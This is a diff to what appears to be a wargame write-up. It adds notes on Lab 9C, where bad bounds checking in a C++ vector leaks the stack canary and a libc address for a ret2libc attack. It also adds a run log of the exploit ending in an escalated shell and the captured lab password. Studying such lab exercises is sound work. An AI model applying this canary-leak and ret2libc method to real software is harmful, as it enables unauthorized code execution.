@@ -562,3 +562,33 @@ uid=1031(lab8A) gid=1032(lab8A) euid=1032(lab8end) groups=1033(lab8end),1001(gam
 $ cat ~lab8end/.pass
 H4x0r5_d0nt_N33d_m3t4pHYS1c5
 ```
+
+## Lab 9
+### Lab 9C
+
+* C++. Implements a 'vector' of ints that doesn't resize and only supports `get` and `append`.
+* Bad bounds checking.
+* For some reason `alloc_len` is set very incorrectly, letting us read a huge range of memory.
+  * It's because alloc_len is based on the value of len, but runs before len is assigned a 1.
+* Can leak canary at index 257 of the vector
+* Can leak a libc address (index 0 is fine)
+* Can use this to find `system` and "/bin/sh".
+* Simple ret2libc.
+* See _lab9C.py_.
+
+```bash
+lab9C@warzone:/levels/lab09$ python /tmp/lab9C.py
+[+] Starting program '/levels/lab09/lab9C': Done
+[*] [1443]
+[*] Paused (press any to continue)
+[*] Got leaked address at 0xb7d4dffd
+[*] Found system at 0xb7d7b190
+[*] Found '/bin/sh' at 0xb7e9ba24
+[*] found canary 0x59006c00
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+$ id
+uid=1033(lab9C) gid=1034(lab9C) euid=1034(lab9A) groups=1035(lab9A),1001(gameuser),1034(lab9C)
+$ cat ~lab9A/.pass
+1_th0uGht_th4t_w4rn1ng_wa5_l4m3
+```
